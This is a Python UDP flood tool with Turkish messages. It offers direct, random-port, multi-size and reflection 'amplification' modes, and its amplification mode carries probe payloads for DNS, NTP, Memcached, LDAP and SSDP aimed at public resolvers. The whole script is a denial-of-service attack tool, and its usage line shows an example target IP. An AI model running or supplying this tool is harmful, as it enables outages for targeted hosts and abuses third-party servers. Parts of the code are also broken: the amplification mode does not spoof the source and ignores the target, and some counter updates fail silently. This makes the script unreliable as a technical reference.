#!/usr/bin/env python3
import socket, random, time, sys, threading, os, signal

_stop = False
_packets = 0
_bytes = 0
_lock = threading.Lock()

# Amplification payload'ları (DNS, NTP, Memcached, vs.)
AMPLIFICATION = {
    53: b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\xff\xff\xff\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
    123: b'\x17\x00\x03\x2a' + b'\x00' * 4,
    11211: b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
    19: b'\x00',
    389: b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
    1900: b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nST: ssdp:all\r\nMan: "ssdp:discover"\r\nMX: 3\r\n\r\n',
}

REFLECTORS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "208.67.222.222", "208.67.220.220", "9.9.9.9",
    "149.112.112.112", "64.6.64.6", "64.6.65.6",
]

def random_port(): return random.randint(1024, 65535)

def direct_flood(ip, port, size, threads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    payload = os.urandom(size)
    while not _stop:
        try:
            sock.sendto(payload, (ip, port))
            with _lock: global _packets, _bytes; _packets += 1; _bytes += size
        except: pass
    sock.close()

def random_port_flood(ip, port, size, threads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    payload = os.urandom(size)
    while not _stop:
        try:
            sock.sendto(payload, (ip, random.choice([port, random.randint(1,1024)])))
            with _lock: _packets += 1; _bytes += size
        except: pass
    sock.close()

def multi_size_flood(ip, port, size, threads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    sizes = [64, 128, 256, 512, 1024, 1400, 1500]
    while not _stop:
        try:
            s = random.choice(sizes)
            sock.sendto(os.urandom(s), (ip, port))
            with _lock: _packets += 1; _bytes += s
        except: pass
    sock.close()

def amp_flood(ip, port, size, threads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    while not _stop:
        try:
            p = random.choice(list(AMPLIFICATION.keys()))
            reflector = socket.gethostbyname(random.choice(REFLECTORS))
            sock.sendto(AMPLIFICATION[p], (reflector, p))
            with _lock: _packets += 1; _bytes += len(AMPLIFICATION[p])
        except: pass
    sock.close()

def stats(start):
    last_p, last_t = 0, start
    while not _stop:
        time.sleep(1)
        now = time.time()
        with _lock: p, b = _packets, _bytes
        pps = (p - last_p) / (now - last_t)
        mbps = (b * 8) / (1024 * 1024) / (now - start)
        gbps = mbps / 1024
        print(f"\r\033[96m[STAT] {p:,} pkts | {pps:,.0f} pps | {mbps:.2f} Mbps | {gbps:.2f} Gbps\033[0m", end='', flush=True)
        last_p, last_t = p, now

def signal_handler(sig, frame):
    global _stop
    print("\n\033[93m[!] Durduruluyor...\033[0m")
    _stop = True

def main():
    if len(sys.argv) < 6:
        print("Kullanım: python3 udp_final.py <ip> <port> <sure> <thread> <mode> [size]")
        print("Mode: 1=Direct, 2=Random Port, 3=Multi-Size, 4=Amplification")
        print("Örnek: python3 udp_final.py 194.44.134.194 53 60 200 1 512")
        print("       python3 udp_final.py 194.44.134.194 53 60 100 4")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    sure = int(sys.argv[3])
    thread = int(sys.argv[4])
    mode = int(sys.argv[5])
    size = int(sys.argv[6]) if len(sys.argv) > 6 else 512

    signal.signal(signal.SIGINT, signal_handler)

    print(f"\n\033[92mUDP FLOOD MODE {mode} -> {ip}:{port} | {thread} Thread | {sure}s\033[0m")
    if mode == 4:
        print("\033[93mAmplification Mode: Reflektörlere saldırır, hedefe yansır!\033[0m")

    funcs = {1: direct_flood, 2: random_port_flood, 3: multi_size_flood, 4: amp_flood}
    args = (ip, port, size, thread)

    for _ in range(thread):
        threading.Thread(target=funcs[mode], args=args, daemon=True).start()
        time.sleep(0.0005)

    threading.Thread(target=stats, args=(time.time(),), daemon=True).start()
    time.sleep(sure)
    global _stop; _stop = True
    time.sleep(1)

    with _lock:
        print(f"\n\033[92m[+] Toplam Paket: {_packets:,}\033[0m")
        print(f"\033[92m[+] Ortalama PPS: {_packets/sure:,.0f}\033[0m")
        print(f"\033[92m[+] Ortalama Hız: {(_bytes*8)/(1024*1024*1024)/sure:.2f} Gbps\033[0m")

if __name__ == "__main__":
    main()
